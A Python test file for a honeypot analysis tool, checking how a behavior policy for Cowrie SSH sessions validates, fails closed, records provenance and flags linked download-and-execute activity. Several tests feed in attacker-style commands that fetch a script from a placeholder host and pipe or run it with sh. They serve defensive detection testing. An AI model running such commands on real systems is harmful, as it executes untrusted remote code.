from __future__ import annotations

import json
from copy import deepcopy
from pathlib import Path

from production.policies.threat_hypothesis_behavior_policy import (
    DEFAULT_POLICY_PATH,
    load_behavior_policy,
    policy_summary,
    resolve_behavior_policy,
    validate_behavior_policy,
)
from production.reporting.session_assessment_v4 import build_session_assessment_v4


PROJECT_ROOT = Path(__file__).resolve().parents[1]
TRUSTED_POLICY_PATH = PROJECT_ROOT / DEFAULT_POLICY_PATH


def _policy() -> dict:
    return json.loads(TRUSTED_POLICY_PATH.read_text(encoding="utf-8"))


def _session_report(commands: list[str], *, policy_document: dict | None = None) -> dict:
    session_id = "behavior-policy-test"
    events = [
        {
            "session": session_id,
            "src_ip": "192.0.2.10",
            "timestamp": f"2026-07-16T00:00:{index:02d}Z",
            "eventid": "cowrie.command.input",
            "input": command,
        }
        for index, command in enumerate(commands, start=1)
    ]
    payload = {
        "session_id": session_id,
        "commands": commands,
        "classification_events": [],
        "raw_events": events,
    }
    return build_session_assessment_v4(
        [payload],
        raw_events=events,
        behavior_policy_document=policy_document,
        behavior_policy_path=str(TRUSTED_POLICY_PATH),
        classification_policy_path="configs/classification_rules.trusted.json",
    )


def _finding_types(report: dict) -> set[str]:
    return {
        str(finding.get("finding_type") or "")
        for finding in report["behavioral_findings"]
    }


def test_trusted_behavior_policy_is_valid_and_records_provenance() -> None:
    policy = _policy()
    assert validate_behavior_policy(policy) == []

    loaded = load_behavior_policy(str(TRUSTED_POLICY_PATH))
    summary = policy_summary(loaded)
    assert summary == {
        "schema_version": "threat_hypothesis_behavior_policy.v1",
        "policy_id": "cowrie-ssh-threat-hypothesis-behavior",
        "version": "2026-07-29-sensitive-read-v1",
        "enabled": True,
        "reviewed": True,
        "review_status": "approved for scoped Cowrie SSH analysis",
        "last_reviewed": "2026-07-29",
        "method": "developer-authored conservative behavior policy",
        "load_status": "loaded",
        "source": "threat_hypothesis_behavior.trusted.json",
        "fallback_used": False,
        "operating_mode": "trusted_selected_policy",
        "requested_policy_honored": True,
        "load_error_count": 0,
    }
    assert loaded["provenance"]["reviewed"] is True
    assert loaded["provenance"]["review_status"]


def test_policy_validator_rejects_invalid_regex_and_unsafe_claim_text() -> None:
    invalid_regex = _policy()
    bare_sentinel = "behavior-policy-bare-secret-25c7"
    invalid_regex["policy"]["extraction"]["patterns"]["url"] = f"(?P<{bare_sentinel}>"
    regex_errors = validate_behavior_policy(invalid_regex)
    assert any("invalid regex" in error for error in regex_errors)
    assert bare_sentinel not in json.dumps(regex_errors)

    unsafe_claim = _policy()
    unsafe_claim["policy"]["claims"]["connected"][0]["text"] = (
        "Confirmed compromise and attacker intent."
    )
    assert any(
        "unsupported high-impact claim" in error
        for error in validate_behavior_policy(unsafe_claim)
    )


def test_invalid_in_memory_policy_fails_closed_without_behavior_claims() -> None:
    policy = _policy()
    policy["policy"]["claims"]["connected"][0]["text"] = "Confirmed compromise."
    resolved = resolve_behavior_policy(policy)
    assert policy_summary(resolved)["load_status"] == "fail_closed"
    assert policy_summary(resolved)["source"] == "invalid_in_memory_policy"

    report = _session_report(
        ["curl https://example.invalid/a.sh | sh"],
        policy_document=policy,
    )
    assert report["status"] == "observation_only_abstention"
    assert report["canonical_evidence"]["observations"]
    assert report["behavioral_findings"] == []
    assert report["hypothesis_sets"] == []


def test_malformed_explicit_policy_fails_closed_without_substitution(tmp_path: Path) -> None:
    malformed = tmp_path / "invalid-policy.json"
    malformed.write_text("{not-json", encoding="utf-8")

    loaded = load_behavior_policy(str(malformed))
    summary = policy_summary(loaded)
    assert summary["policy_id"] == "fail-closed-threat-hypothesis-behavior"
    assert summary["enabled"] is False
    assert summary["fallback_used"] is True
    assert summary["operating_mode"] == "fail_closed"
    assert summary["requested_policy_honored"] is False
    assert summary["load_error_count"] >= 1


def test_disabled_policy_retains_direct_events_but_suppresses_behavior_claims() -> None:
    policy = _policy()
    policy["policy"]["enabled"] = False
    policy.pop("load_status", None)

    report = _session_report(
        ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
        policy_document=policy,
    )
    assert report["status"] == "observation_only_abstention"
    assert len(report["canonical_evidence"]["direct_cowrie_events"]) == 2
    assert report["behavioral_findings"] == []
    assert report["hypothesis_sets"] == []


def test_new_remote_executable_can_be_added_without_python_changes() -> None:
    commands = [
        "fetch https://example.invalid/a.sh -o /tmp/a.sh",
        "sh /tmp/a.sh",
    ]
    default_report = _session_report(commands)
    assert "connected_transfer_execution" not in _finding_types(default_report)

    policy = _policy()
    policy["policy"]["extraction"]["remote_content_executables"]["fetch"] = {
        "output_options": ["-o"],
        "transfer_without_output": False,
        "pipe_source": False,
    }
    policy.pop("load_status", None)
    assert validate_behavior_policy(policy) == []

    report = _session_report(commands, policy_document=policy)
    assert "connected_transfer_execution" in _finding_types(report)
    observations = report["canonical_evidence"]["observations"]
    assert len(observations) == 2
    assert report["canonical_evidence"]["connected_behavior_chains"]
    assert report["provenance"]["behavior_policy"]["load_status"] == "provided"


def test_connected_claim_precedence_can_be_extended_without_python_changes() -> None:
    policy = deepcopy(_policy())
    policy["policy"]["claims"]["connected"].insert(0, {
        "rule_id": "reviewed-transfer-execution-test-rule",
        "required_action_types": ["transfer_attempt", "execution_attempt"],
        "excluded_action_types": [],
        "claim_type": "reviewed_transfer_execution_observation",
        "text": "A reviewed test rule observed linked transfer and execution attempts for one path.",
        "evidence_status_override": "partially_supported",
        "limitations": ["This test rule does not establish successful execution."],
    })
    policy.pop("load_status", None)
    assert validate_behavior_policy(policy) == []

    report = _session_report(
        ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
        policy_document=policy,
    )
    finding = report["behavioral_findings"][0]
    assert finding["finding_type"] == "reviewed_transfer_execution_observation"
    assert finding["behavior_policy_rule_id"] == (
        "reviewed-transfer-execution-test-rule"
    )


def test_policy_provenance_is_exposed_across_canonical_sections() -> None:
    report = _session_report(["curl https://example.invalid/a.sh -o /tmp/a.sh"])
    expected = report["provenance"]["behavior_policy"]
    assert expected["policy_id"] == "cowrie-ssh-threat-hypothesis-behavior"
    assert expected["sha256"]
    assert report["canonical_evidence"]["evidence_sha256"] == (
        report["provenance"]["evidence_sha256"]
    )
